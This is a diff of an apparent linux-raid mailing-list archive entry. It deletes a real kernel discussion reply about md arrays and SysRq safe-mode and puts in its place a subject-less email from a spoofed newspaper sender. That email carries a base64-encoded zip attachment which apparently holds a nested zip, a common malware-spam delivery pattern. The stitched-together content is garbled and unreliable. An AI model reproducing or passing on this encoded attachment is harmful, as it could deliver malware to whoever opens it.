@@ -1,39 +1,70 @@
-From: Henrique de Moraes Holschuh <hmh@hmh.eng.br>
-Subject: Re: [PATCH] md: don't use flush_signals in userspace processes
-Date: Fri, 9 Jun 2017 00:27:28 -0300
-Message-ID: <20170609032728.GA25899@khazad-dum.debian.net>
-References: <alpine.LRH.2.02.1706071834250.22850@file01.intranet.prod.int.rdu2.redhat.com>
- <87h8zrart4.fsf@notabene.neil.brown.name>
- <alpine.LRH.2.02.1706081847150.3603@file01.intranet.prod.int.rdu2.redhat.com>
- <87shja9b7s.fsf@notabene.neil.brown.name>
+From: <citydesk@thereporteronline.com>
+Subject: (unknown)
+Date: Fri, 09 Jun 2017 04:30:23 -0000
+Message-ID: <149698262314.12492.4208422069530792867@san.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Return-path: <linux-kernel-owner@vger.kernel.org>
-Content-Disposition: inline
-In-Reply-To: <87shja9b7s.fsf@notabene.neil.brown.name>
-Sender: linux-kernel-owner@vger.kernel.org
-To: NeilBrown <neilb@suse.com>
-Cc: Mikulas Patocka <mpatocka@redhat.com>, Shaohua Li <shli@kernel.org>, linux-raid@vger.kernel.org, linux-kernel@vger.kernel.org, Ingo Molnar <mingo@redhat.com>, Peter Zijlstra <peterz@infradead.org>
+Content-Type: application/zip; name="846894449555915.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-raid-owner@vger.kernel.org>
+Content-Disposition: attachment
+Subject: 
+Sender: linux-raid-owner@vger.kernel.org
+To: linux-raid@vger.kernel.org
 List-Id: linux-raid.ids
 
-On Fri, 09 Jun 2017, NeilBrown wrote:
-> Or maybe it could be discarded - the md_check_recovery() thing.
-> The idea was that if you alt-sysrq-K to kill all processes, md arrays
-> would go into immediate-safe-mode where the metadata is marked clean
-> immediately after writes finish, rather than waiting a few seconds.  The
-> chance of having a clean array after shutdown is hopefully improved.
-> 
-> I've never actually used this though, and I doubt many people know about
-> it.  And bitmaps make it fairly pointless.
-
-Hmm, I have, although I had no idea this was why my arrays were getting
-far less frazzled than expected...  It is really useful behavior, now
-that I know it can do that.
-
-If you can teach SysRq+S, and especially SysRq+U, to force all arrays
-into safe-mode *after* they carried their current meanings
-(sync/umount), that would be more useful though, and it would help a lot
-of people to avoid dirty arrays without them even knowing why...
-
--- 
-  Henrique Holschuh
+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
